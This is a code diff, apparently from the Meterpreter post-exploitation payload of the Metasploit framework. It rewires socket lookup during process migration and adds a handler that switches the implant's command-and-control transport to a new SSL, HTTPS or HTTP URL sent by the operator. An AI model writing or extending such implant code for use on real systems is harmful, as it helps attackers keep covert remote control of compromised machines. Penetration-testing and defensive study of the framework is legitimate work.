@@ -49,7 +49,9 @@ remote_request_core_migrate(Remote *remote, Packet *packet)
 			l.entry_point, 
 			sock_path);
 
-	orig_fd = remote_get_fd(remote);
+	if (remote->transport->get_socket) {
+		orig_fd = remote->transport->get_socket(remote->transport);
+	}
 	
 	dprintf("[MIGRATE] Creating passfd thread to share socket %d", orig_fd);
 
@@ -85,3 +87,53 @@ remote_request_core_migrate(Remote *remote, Packet *packet)
 	return FALSE;
 }
 
+BOOL
+remote_request_core_change_transport(Remote* remote, Packet* packet, DWORD* pResult) {
+	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
+	Packet* response = packet_create_response(packet);
+	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANSPORT_TYPE);
+	char* transportUrl = packet_get_tlv_value_string(packet, TLV_TYPE_TRANSPORT_URL);
+	size_t urlSize;
+
+	dprintf("[CHANGE TRANS] Type: %u", transportType);
+	dprintf("[CHANGE TRANS] Url: %s", transportUrl);
+
+	if (response == NULL || transportUrl == NULL) {
+		dprintf("[CHANGE TRANS] Something was NULL");
+		goto out;
+	}
+
+	remote->pNextTransportUrl = strdup(transportUrl);
+	if (remote->pNextTransportUrl == NULL) {
+		dprintf("[CHANGE TRANS] Couldn't allocate next transport type");
+		goto out;
+	}
+
+	if (transportType == METERPRETER_TRANSPORT_SSL) {
+		remote->pNextTransportType = strdup("TRANSPORT_SSL");
+	}
+	else if (transportType == METERPRETER_TRANSPORT_HTTPS) {
+		remote->pNextTransportType = strdup("TRANSPORT_HTTPS");
+	}
+	else if (transportType == METERPRETER_TRANSPORT_HTTP) {
+		remote->pNextTransportType = strdup("TRANSPORT_HTTP");
+	}
+	else {
+		dprintf("[CHANGE TRANS] Transport type is invalid");
+
+		// fail!
+		free(remote->pNextTransportUrl);
+		remote->pNextTransportUrl = NULL;
+		goto out;
+	}
+
+	// tell the server dispatch to exit, it should pick up the new transport
+	result = ERROR_SUCCESS;
+out:
+
+	if (packet) {
+		packet_transmit_empty_response(remote, response, result);
+	}
+
+	return result == ERROR_SUCCESS ? FALSE : TRUE;
+}
